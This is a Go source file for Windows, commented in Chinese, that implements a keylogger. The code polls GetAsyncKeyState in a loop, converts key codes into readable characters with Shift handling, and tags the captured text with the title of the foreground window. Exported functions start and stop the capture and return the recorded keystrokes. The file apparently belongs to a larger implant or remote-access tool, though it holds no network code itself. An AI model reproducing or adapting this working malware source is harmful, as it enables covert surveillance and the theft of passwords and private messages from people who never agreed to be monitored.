//go:build windows

package core

import (
	"fmt"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	user32k = syscall.NewLazyDLL("user32.dll")

	procGetAsyncKeyState    = user32k.NewProc("GetAsyncKeyState")
	procGetForegroundWindow = user32k.NewProc("GetForegroundWindow")
	procGetWindowTextW      = user32k.NewProc("GetWindowTextW")
)

// keyloggerState 键盘记录器状态
type keyloggerState struct {
	mu      sync.Mutex
	running bool
	buf     strings.Builder
	lastVk  uint32
	lastWin string
	stopCh  chan struct{}
}

var klog = &keyloggerState{}

// StartKeylogger 启动键盘记录器（轮询GetAsyncKeyState方式）
func StartKeylogger() error {
	klog.mu.Lock()
	defer klog.mu.Unlock()

	if klog.running {
		return fmt.Errorf("keylogger already running")
	}

	klog.buf.Reset()
	klog.lastVk = 0
	klog.lastWin = ""
	klog.stopCh = make(chan struct{})
	klog.running = true

	go keyloggerPollLoop()

	return nil
}

// StopKeylogger 停止键盘记录器并返回捕获的按键记录
func StopKeylogger() (string, error) {
	klog.mu.Lock()
	if !klog.running {
		defer klog.mu.Unlock()
		return klog.buf.String(), nil
	}
	klog.running = false
	close(klog.stopCh)
	klog.mu.Unlock()

	// 给一小段时间确保最后的按键写入
	time.Sleep(200 * time.Millisecond)

	klog.mu.Lock()
	result := klog.buf.String()
	klog.mu.Unlock()
	return result, nil
}

// IsKeyloggerRunning 返回键盘记录器是否在运行
func IsKeyloggerRunning() bool {
	klog.mu.Lock()
	defer klog.mu.Unlock()
	return klog.running
}

// keyloggerPollLoop 轮询按键状态
func keyloggerPollLoop() {
	ticker := time.NewTicker(30 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-klog.stopCh:
			return
		case <-ticker.C:
			pollKeys()
		}
	}
}

// pollKeys 轮询所有可能的虚拟键
func pollKeys() {
	klog.mu.Lock()
	if !klog.running {
		klog.mu.Unlock()
		return
	}
	klog.mu.Unlock()

	// 轮询所有标准虚拟键
	for vk := uint32(0x08); vk <= 0x5D; vk++ {
		state, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
		if state&0x8000 != 0 {
			handleKeyDown(vk)
		}
	}

	// 轮询功能键
	for vk := uint32(0x70); vk <= 0x7B; vk++ {
		state, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
		if state&0x8000 != 0 {
			handleKeyDown(vk)
		}
	}
}

// handleKeyDown 处理按键按下
func handleKeyDown(vk uint32) {
	klog.mu.Lock()
	defer klog.mu.Unlock()

	if !klog.running {
		return
	}

	// 防止重复记录
	if vk == klog.lastVk {
		return
	}
	klog.lastVk = vk

	// 获取修饰键状态
	shift := isKeyDown(0x10)
	ctrl := isKeyDown(0x11)
	alt := isKeyDown(0x12)

	// 获取当前窗口标题
	windowTitle := getActiveWindowTitle()
	if windowTitle != "" && windowTitle != klog.lastWin {
		klog.buf.WriteString(fmt.Sprintf("\n\n[%s]\n", windowTitle))
		klog.lastWin = windowTitle
	}

	// 特殊键处理
	switch vk {
	case 0x08:
		klog.buf.WriteString("[BS]")
		return
	case 0x09:
		klog.buf.WriteString("[TAB]")
		return
	case 0x0D:
		klog.buf.WriteString("[ENTER]\n")
		return
	case 0x1B:
		klog.buf.WriteString("[ESC]")
		return
	case 0x20:
		klog.buf.WriteString(" ")
		return
	case 0x2E:
		klog.buf.WriteString("[DEL]")
		return
	case 0x21:
		klog.buf.WriteString("[PGUP]")
		return
	case 0x22:
		klog.buf.WriteString("[PGDN]")
		return
	case 0x23:
		klog.buf.WriteString("[END]")
		return
	case 0x24:
		klog.buf.WriteString("[HOME]")
		return
	case 0x25:
		klog.buf.WriteString("[LEFT]")
		return
	case 0x26:
		klog.buf.WriteString("[UP]")
		return
	case 0x27:
		klog.buf.WriteString("[RIGHT]")
		return
	case 0x28:
		klog.buf.WriteString("[DOWN]")
		return
	case 0x2A:
		klog.buf.WriteString("[PRTSC]")
		return
	case 0x2D:
		klog.buf.WriteString("[INS]")
		return
	case 0x5B:
		klog.buf.WriteString("[LWIN]")
		return
	case 0x5C:
		klog.buf.WriteString("[RWIN]")
		return
	case 0x5D:
		klog.buf.WriteString("[MENU]")
		return
	case 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B:
		klog.buf.WriteString(fmt.Sprintf("[F%d]", vk-0x6F))
		return
	}

	// ALT+Ctrl组合忽略
	if alt || ctrl {
		return
	}

	// 普通字符转换
	char := vkToChar(vk, shift)
	if char != 0 && char >= 0x20 {
		klog.buf.WriteByte(char)
	}
}

// isKeyDown 使用GetAsyncKeyState检查按键状态
func isKeyDown(vk uint32) bool {
	state, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
	return state&0x8000 != 0
}

// vkToChar 虚拟键码转字符（简化版）
func vkToChar(vk uint32, shift bool) byte {
	// 字母
	if vk >= 'A' && vk <= 'Z' {
		if shift {
			return byte(vk)
		}
		return byte(vk + 32)
	}

	// 数字键
	if vk >= '0' && vk <= '9' {
		if shift {
			shiftMap := map[uint32]byte{
				'0': ')', '1': '!', '2': '@', '3': '#', '4': '$',
				'5': '%', '6': '^', '7': '&', '8': '*', '9': '(',
			}
			if c, ok := shiftMap[vk]; ok {
				return c
			}
		}
		return byte(vk)
	}

	// 特殊字符
	specialKeys := map[uint32]byte{
		0xBA: ';', 0xBB: '=', 0xBC: ',', 0xBD: '-', 0xBE: '.', 0xBF: '/',
		0xC0: '`', 0xDB: '[', 0xDC: '\\', 0xDD: ']', 0xDE: '\'',
	}
	shiftSpecial := map[uint32]byte{
		0xBA: ':', 0xBB: '+', 0xBC: '<', 0xBD: '_', 0xBE: '>', 0xBF: '?',
		0xC0: '~', 0xDB: '{', 0xDC: '|', 0xDD: '}', 0xDE: '"',
	}

	if shift {
		if c, ok := shiftSpecial[vk]; ok {
			return c
		}
	}
	if c, ok := specialKeys[vk]; ok {
		return c
	}

	return 0
}

// getActiveWindowTitle 获取当前活动窗口标题
func getActiveWindowTitle() string {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return ""
	}
	buf := make([]uint16, 256)
	procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), 255)
	return syscall.UTF16ToString(buf)
}
